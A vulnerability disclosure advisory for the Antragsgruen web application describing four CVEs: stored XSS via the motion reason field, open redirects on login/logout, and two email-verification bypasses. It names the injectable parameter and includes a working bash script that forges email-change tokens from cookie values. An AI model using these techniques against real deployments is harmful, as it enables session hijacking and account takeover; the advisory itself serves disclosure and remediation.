Stored XSS in Motion Reason
---------------------------

Severity Rating: High 
Vector: XSS
CVE: CVE-2024-46884
CWE: 80 - Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
CVSS Score: 9.6
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H

Analysis:

Anonymous users are often allowed to create new motions in Antragsgruen. When creating these, it is possible to go back and edit the motion via https://antragsgruen/std/motionname-id/edit. There is an optional field reason, which is not properly filtered against XSS attacks. The reason is passed via parameter sections[10] to the application and can be used for XSS injections. The XSS triggers when an administrator handles the motion and allows normal users to hijack the administrator's session. Another way to trigger the XSS after the publication is when visiting the HTML view via https://antragsgruen/std/motionname-id/plainhtml
Other fields are not filtered either when using the edit endpoint.


Proof of Concept:

Tamper the submitted data at https://antragsgruen/std/motionname-id/edit


Workarounds:

Only allow registered users to submit motions to mitigate the attack vector to some extent.


Open Redirect in Login and Logout
---------------------------------

Severity Rating: Medium 
Vector: Open URL redirect
CVE: CVE-2024-46882 
CWE: 601 - URL Redirection to Untrusted Site
CVSS Score: 6.1
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Credit: X41 D-Sec GmbH, Eric Sesterhenn


Analysis:

Two open URL redirects were discovered in the web application. The logout redirect will instantly redirect the user to an attacker-controlled webpage, which makes phishing attacks easier. An attacker can send a link to a user of the application, potentially having them believe they are opening the application when it will, in fact, redirect them to a page controlled by the attacker. The page could pretend to be Antragsgruen's login page, or another page that suits the attacker's goal.


Proof of Concept:

Workarounds:

No workaround is currently known.


Email Verification Bypass After Sign-up
---------------------------------------

Severity Rating: Medium
Vector: Authentication
CVE: CVE-2024-46883
CWE: 287 - Improper Authentication
CVSS Score: 5.3
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
Credit: X41 D-Sec GmbH, Yassine El Baaj


Analysis:

After users sign up, they are redirected to a page where they are expected to enter a code that has been sent per email to validate their account. This can be bypassed by simply clicking on another component of the user interface, the home button for example. The user is essentially logged in before completing the verification step. In addition to that, X41 noticed that browsing the application with a non-verified account did not have an impact on its functionality. Meaning that a non-verified user could do anything a verified one could also do.


Workaround:

No workaround is currently known.


Email Verification Bypass After Email Change
--------------------------------------------

Severity Rating: 
Vector: Email Verification
CVE: CVE-2024-46883
CWE: 345 - Insufficient Verification of Data Authenticity
CVSS Score: 5.3
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
Credit: X41 D-Sec GmbH, Yassine El Baaj, JM


Analysis:

When a user requests a change of their email address, a random code is sent to the new address which they have to enter in order to prove access to the new address. This code is generated in createEmailChangeToken() in models/db/User.php as follows:

    public function createEmailChangeToken(string $newEmail, int $timestamp): string
    {
        // [...]
        $key = $newEmail . $timestamp . $this->id . $this->authKey;
        return substr(sha1($key), 0, 10);
    }


All of the components are known to the user. The id and authKey are static values from the database and part of the _identity cookie.
This makes it trivial for a user to generate the required code and change the email address to an address they don't have access to.


Proof of Concept:

X41 has successfully used the following script to generate the required code given the desired email address, the server's Date response header, and values from the _identity cookie.

    #!/bin/bash
    
    read -rp 'Email to change to: ' email
    read -rp 'Date header value: ' datestr
    read -rp 'User ID (first entry of _identity cookie array): ' id
    read -rp 'AuthKey (second entry, including \u0000s: ' authkey
    
    dateint=$(date -d "$datestr" +%s)
    
    raw="${email}${dateint}${id}${authkey}"
    alt_raw="${email}$((dateint-1))${id}${authkey}"
    
    echo ---
    
    echo -ne "exact time:\t"
    echo -ne "$raw" | sha1sum | head -c 10
    echo
    echo -ne "minus 1s:\t"
    echo -ne "$alt_raw" | sha1sum | head -c 10
    echo



Workarounds:

No workaround is currently known.
